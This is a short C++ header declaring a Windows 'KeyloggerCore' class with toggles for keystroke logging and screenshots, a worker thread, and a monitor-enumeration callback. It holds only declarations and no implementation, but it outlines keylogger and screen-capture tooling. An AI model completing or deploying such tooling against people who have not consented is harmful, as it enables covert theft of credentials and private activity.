#pragma once
#include <atomic>
#include <thread>
#include <Windows.h>
#include <gdiplus.h>
#include "FileOutput.h"

class KeyloggerCore {
public:
    KeyloggerCore();
    ~KeyloggerCore();
    void start();
    void stop();
    void setLogging(bool enable);
    void setScreenshots(bool enable);
    bool isLogging() const;
    bool isScreenshots() const;
private:
    void run();
    std::atomic<bool> running;
    std::atomic<bool> logging;
    std::atomic<bool> screenshots;
    std::atomic<bool> stopThread;
    std::thread worker;
    int topLeftX, topLeftY, botRightX, botRightY;
    static BOOL CALLBACK MonitorEnumProc(HMONITOR, HDC, LPRECT, LPARAM);
};
